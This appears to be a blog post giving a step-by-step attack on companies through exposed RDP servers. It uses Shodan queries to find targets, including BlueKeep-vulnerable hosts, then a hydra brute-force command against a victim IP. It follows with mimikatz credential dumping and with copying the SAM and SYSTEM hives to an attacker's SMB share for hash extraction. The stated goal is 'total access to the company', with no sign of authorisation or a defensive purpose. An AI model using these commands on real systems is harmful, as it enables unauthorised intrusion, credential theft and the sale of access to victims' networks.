---
title: Breaking a company with RDP Shodan(Outdated, soon a new one)
published: true
---

RDP is a remote access protocol by which valid users can be logged in, cybercriminals often exploit this port to gain access to companies and sell access to it.

## Searching on Shodan

We need to go to [shodan](https://shodan.io), now we need to log in to be able to search in shodan.

<img src="https://eltallerdelbit.com/wp-content/uploads/2017/11/shodan-search-engine-for-the-internet-of-things.jpg">

Now you need to search with this query.

`` 
port:3389
``

With this we will be looking for those servers with port 3389 open.

Some queries which are advisable to look for

``` ruby
port:3389
port:3389 Country:ES
port:3389 Administrator
port:3389 Administracion
vuln:cve-2019-0708
```

After enter this querys, we can see a lot of servers with the rdp port open.
Thanks to shodan we will be able to see existing users of the system to brute force.

<img src="https://i.ibb.co/7pgxM7w/proof.png">

## Vulnerabilities

During the covid quarantine, cybercriminals were exploiting vulnerabilities in servers with port 3389, several of the vulnerabilities were as follows.

### Bluekeep (CVE-2019-0708)

*BlueKeep seeks to run malicious code in the kernel memory of the server, allowing the hacker to take control of the entire system. The key to sending this code to the server is in the session setup. It’s at this point that BlueKeep sends arbitrary code to the server. The server stores it in memory, then frees the memory up again. However, because the server retains a pointer to the memory, BlueKeep is able to execute the malicious code.*

*Technical analysis [here](https://iotsecuritynews.com/technical-analysis-of-bluekeep/)*

<img src="https://2164375935-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-Lp0LQX2B5gc18QD-Izh%2F-LuIi6zKvZyZXercxtu0%2F-LuJ523Xqfri-cqUzLKw%2FFlinkCEP-Bluekeep-NFA-Schema.jpg?alt=media&token=d806db30-1871-4b46-a7ec-4e68b24d16eb">

### DejaBlue (CVE-2019-1181 CVE-2019-1182 CVE-2019-1222 and CVE-2019-1226) 

*In August 2019, Microsoft used its Patch Tuesday to release new patches related to CVEs affecting the remote desktop protocol. Of those vulnerabilities, four stand out for their striking similarity to the BlueKeep vulnerability.*

- **CVE-2019-1181 and CVE-2019-1182: affect devices running Windows 7, Windows 8.1 or Windows 10, as well as any device running Windows Server 2008, Windows Server 2012, Windows Server 2016 or Windows Server 2019.**

- **CVE-2019-1222 y CVE-2019-1226: afectan a los dispositivos que ejecutan Windows 10 o Windows Server 2019.**

*DejaBlue vulnerabilities are based on flaws in the early stages of an RDP connection. Since the flaws reside in the processes preceding the authentication phase, no prior knowledge of passwords or keys is required to undertake an attack that can ultimately lead to illicit remote code execution.*

*Technical Analysis [here](https://www.malwaretech.com/2019/08/dejablue-analyzing-a-rdp-heap-overflow.html)*

## BruteForce

We are going to use hydra, to make the bruteforce

``` java
hydra -L user.txt -P pass.txt IP_VICTIM rdp
```

<img src="https://1.bp.blogspot.com/-NqCFAA8TlVQ/XufVdykKZnI/AAAAAAAAHB4/wQlcf0Cm3BwGgywbLDklRXJ9P1ZoZzQSQCNcBGAsYHQ/s1600/4_hydra-fuerza-bruta-profundidad-rdp.pnghttps%3A%2F%2Ftelegra.ph%2Ffile%2F3f4b2c33b38d472797e54.png">

## Privesc

After have access to the RDP server with a valid access, now we need to dump the passwords to scalate the privilages with mimikatz.

### Mimikatz

**Obtaining credentials in plain text**

``` ruby
~$> privilage::debug
~$> sekurlsa::logonpasswords
```

<img src="https://www.ngi.es/wp-content/uploads/2021/10/mimikatz_tool_bg.jpg">

**Obtaining sam and system hashes**

``` ruby
~$> reg save HKLM\sam sam.backup
~$> reg save HKLM\system system.backup
```

Now we need to transfer this files to our system with impacket-smbserver

*Server*
``` sh
~$> sudo impacket-smbserver smbFolder $(pwd) -smb2support
```

*Victim*
``` ruby
> copy sam.backup \\10.10.14.60\smbFolder\sam
> copy system.backup \\10.10.14.60\smbFolder\system
```

**Dumping sam and system hashes**
``` ruby
~$> impacket-secretsdump -sam sam -system system LOCAL
```
<img src="https://i.ibb.co/Tr5jV3n/ld.png">

**After this, now we have dumped the credentials and have total access to the company.**